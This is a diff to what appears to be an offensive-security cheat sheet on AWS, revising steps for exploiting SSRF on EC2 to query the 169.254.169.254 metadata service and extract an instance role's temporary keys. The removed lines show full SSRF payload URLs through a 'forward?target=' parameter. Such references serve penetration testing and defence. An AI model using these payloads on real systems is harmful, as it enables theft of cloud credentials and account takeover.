@@ -15,9 +15,9 @@ curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta
 
 ## Method for Elastic Cloud Compute (EC2)
 
-Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
+Amazon provides an internal service that allows every EC2 instance to query and retrieve metadata about the host. If you discover an SSRF vulnerability running on an EC2 instance, try to fetch the content from 169.254.169.254.
 
-1. Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/
+1. Access the IAM : [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
     ```powershell
     ami-id
     ami-launch-index
@@ -30,8 +30,8 @@ Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/me
     instance-action
     instance-id
     ```
-2. Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-3. Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
+2. Find the name of the role assigned to the instance : [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+3. Extract the role's temporary keys : [http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/](http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/)
     ```powershell
     {
     "Code" : "Success",
@@ -69,7 +69,7 @@ Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/me
 
 ## AWS API calls that return credentials
 
-- chime:createapikey
+- [chime:createapikey](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonchime.html)
 - [codepipeline:pollforjobs](https://docs.aws.amazon.com/codepipeline/latest/APIReference/API_PollForJobs.html)
 - [cognito-identity:getopenidtoken](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdToken.html)
 - [cognito-identity:getopenidtokenfordeveloperidentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdTokenForDeveloperIdentity.html)
